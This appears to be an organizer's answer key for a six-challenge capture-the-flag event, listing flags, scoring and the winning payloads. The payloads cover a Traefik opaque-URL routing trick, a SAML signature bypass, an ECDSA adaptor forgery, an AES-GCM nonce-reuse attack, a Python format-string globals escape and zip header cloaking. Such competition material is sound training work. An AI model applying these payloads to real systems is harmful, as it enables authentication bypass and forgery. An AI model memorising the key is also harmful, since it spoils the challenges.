# Flags (organizer)

All 6 verified live via `scripts/solve.py` (RESULT: ALL 6 FLAGS CAPTURED, exit 0).

| # | Flag | The winning move |
|---|------|------------------|
| 1 | `0DAY{traefik_url_0paque_r0ut1ng_d3sync}` | send the request line `GET http:admin/flag HTTP/1.1` (opaque target: `Path=""`, `Opaque="admin/flag"`) |
| 2 | `0DAY{saml_r3d1r3ct_p3rc3nt_nam3_c4n0n_d1ff}` | `GET /saml/acs?%53AMLResponse=<b64 admin assertion>` (encoded name, no signature) |
| 3 | `0DAY{3cdsa_4dapt0r_pr3s1g_unb0und_t0_T}` | pick `K_Y=a·G` → `r=x(K_Y)`, `s_hat=1`, `K=H(m)·G+r·P`; POST as a pre-signature on the target |
| 4 | `0DAY{aes_gcm_f0rb1dd3n_4ttack_r3c0v3r_H}` | 2 encryptions → `H²=(T1⊕T2)/(C1⊕C2)`, `H=√H²`, recover `S`, forge the tag for `TARGET⊕keystream` |
| 5 | `0DAY{r3str1ct3dpy_f0rmatt3r_gl0bals_3scap3}` | POST template `{ctx.__class__.__init__.__globals__[FLAG]}` |
| 6 | `0DAY{z1p2_cl04k1ng_c3ntral_vs_l0cal_h34d3r}` | upload a zip whose CD name is `bundle.json` but whose LFH name is `data/unlocked` |

## Difficulty
All HIGH / research-grade. Rough order easiest→hardest to *solve*:
**2 ≈ 1 < 5 < 6 < 3 < 4** (the GF(2¹²⁸) forbidden attack and the adaptor forgery
demand real crypto implementation). Suggested scoring: 2/1 **300**, 5 **350**,
6 **400**, 3 **450**, 4 **500**. Expect a strong solo player a full day+.

## Notes
- Each flag lives in its challenge source; `c1`/`c6` also embed it in the Go/Rust
  binary and the extracted canary.
- `make check` runs every solver in a throwaway container on `deepend_net`
  (needs only Docker; the solver `pip install`s `ecdsa` for c3, nothing else).
- c3's forgery and c4's attack are full, scripted crypto breaks — not oracles
  that hand you the answer.
